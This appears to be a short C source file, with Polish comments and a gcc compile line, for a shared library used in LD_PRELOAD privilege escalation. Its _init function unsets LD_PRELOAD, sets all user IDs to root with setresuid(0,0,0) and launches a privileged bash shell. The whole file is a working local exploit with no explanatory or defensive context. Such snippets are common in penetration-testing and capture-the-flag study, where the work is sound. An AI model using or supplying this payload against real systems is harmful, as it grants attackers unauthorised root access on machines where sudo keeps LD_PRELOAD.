// gcc -fPIC -shared -nostartfiles -o <name>.so <kod>.c


#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
        unsetenv("LD_PRELOAD");    // usuwa zmienna srodowiskowa
        setresuid(0,0,0);          
        system("/bin/bash -p");
}
